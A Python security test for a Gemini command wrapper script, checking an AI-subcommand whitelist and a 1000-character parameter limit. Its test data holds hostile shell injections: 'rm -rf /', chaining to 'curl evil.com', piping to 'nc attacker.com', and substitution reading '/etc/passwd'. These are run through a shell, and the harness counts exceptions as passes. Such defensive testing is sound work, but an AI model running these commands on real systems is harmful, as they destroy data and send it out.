#!/usr/bin/env python3
"""
Security test for AI command whitelist in Gemini wrapper.

This test verifies that the wrapper correctly handles AI subcommands,
including potentially dangerous ones.
"""

import subprocess
import os
from pathlib import Path


def test_ai_whitelist_security():
    """Test that AI command whitelist properly filters dangerous subcommands."""

    project_root = Path(__file__).parent
    wrapper_path = project_root / ".gemini" / "pm-wrapper.sh"

    if not wrapper_path.exists():
        print(f"❌ Wrapper not found at {wrapper_path}")
        return False

    print("Testing AI command whitelist security...")

    # Test 1: Allowed AI commands
    allowed_tests = [
        ("ai status", True, "status subcommand should be allowed"),
        ("ai route 'test query'", True, "route subcommand should be allowed"),
        ("ai config", True, "config subcommand should be allowed"),
    ]

    # Test 2: Dangerous patterns (should be blocked at wrapper level)
    dangerous_tests = [
        ("ai'; rm -rf /", False, "injection attempt should be blocked"),
        ("ai && curl evil.com", False, "command chaining should be blocked"),
        ("ai | nc attacker.com 1234", False, "pipe to netcat should be blocked"),
        ("ai `cat /etc/passwd`", False, "command substitution should be blocked"),
    ]

    all_passed = True

    print("\n✅ Testing allowed AI commands:")
    for cmd, should_pass, description in allowed_tests:
        try:
            result = subprocess.run(
                [str(wrapper_path)] + cmd.split(),
                capture_output=True,
                text=True,
                timeout=5,
                cwd=str(project_root)
            )

            # Check if command was allowed (no explicit error about not allowed)
            passed = "not allowed" not in result.stderr.lower()

            if passed == should_pass:
                print(f"  ✅ {description}")
            else:
                print(f"  ❌ {description} - Expected {should_pass}, got {passed}")
                all_passed = False

        except Exception as e:
            print(f"  ❌ {description} - Exception: {e}")
            all_passed = False

    print("\n🛡️ Testing dangerous patterns:")
    for cmd, should_pass, description in dangerous_tests:
        try:
            # These should be blocked by shell escaping/sanitization
            result = subprocess.run(
                f"{wrapper_path} {cmd}",
                shell=True,  # Use shell to test injection
                capture_output=True,
                text=True,
                timeout=5,
                cwd=str(project_root)
            )

            # Check if dangerous pattern was blocked
            # Success here means the injection was prevented
            blocked = (
                "not allowed" in result.stderr.lower() or
                "syntax error" in result.stderr.lower() or
                result.returncode != 0
            )

            if blocked:
                print(f"  ✅ {description} - Properly blocked")
            else:
                print(f"  ❌ {description} - NOT blocked! Security risk!")
                all_passed = False

        except subprocess.TimeoutExpired:
            print(f"  ✅ {description} - Timed out (blocked)")
        except Exception as e:
            print(f"  ✅ {description} - Failed safely: {e}")

    print("\n" + "="*50)
    if all_passed:
        print("✅ All AI whitelist security tests passed!")
    else:
        print("❌ Some security tests failed. Review wrapper implementation.")

    return all_passed


def test_wrapper_parameter_limits():
    """Test that wrapper enforces parameter length limits (1000 chars max)."""

    project_root = Path(__file__).parent
    wrapper_path = project_root / ".gemini" / "pm-wrapper.sh"

    if not wrapper_path.exists():
        print(f"❌ Wrapper not found at {wrapper_path}")
        return False

    print("\nTesting parameter length limits (1000 chars max)...")

    # Test 1: Parameter within limit (should succeed)
    normal_param = "A" * 999

    try:
        result = subprocess.run(
            [str(wrapper_path), "capture", normal_param],
            capture_output=True,
            text=True,
            timeout=5,
            cwd=str(project_root)
        )

        if "parameter too long" in result.stderr.lower():
            print(f"  ❌ Normal parameter (999 chars) incorrectly blocked")
            return False
    except Exception as e:
        print(f"  ❌ Exception with normal parameter: {e}")
        return False

    # Test 2: Parameter exceeding limit (should be blocked)
    long_param = "A" * 1001

    try:
        result = subprocess.run(
            [str(wrapper_path), "capture", long_param],
            capture_output=True,
            text=True,
            timeout=5,
            cwd=str(project_root)
        )

        # The wrapper should block parameters over 1000 chars
        if "parameter too long" in result.stderr.lower():
            print(f"  ✅ Long parameters (>1000 chars) are properly blocked")
            return True
        else:
            print(f"  ❌ Long parameter not properly blocked")
            print(f"      Stderr: {result.stderr[:200]}")
            return False

    except Exception as e:
        print(f"  ❌ Exception during test: {e}")
        return False


if __name__ == "__main__":
    print("🔒 AI Command Whitelist Security Test\n")
    print("="*50)

    test1_passed = test_ai_whitelist_security()
    test2_passed = test_wrapper_parameter_limits()

    print("\n" + "="*50)
    print("📊 Final Results:")
    print(f"  AI Whitelist Security: {'✅ PASS' if test1_passed else '❌ FAIL'}")
    print(f"  Parameter Limits: {'✅ PASS' if test2_passed else '❌ FAIL'}")

    if test1_passed and test2_passed:
        print("\n✅ All security tests passed!")
        exit(0)
    else:
        print("\n❌ Some tests failed. Please review security implementation.")
        exit(1)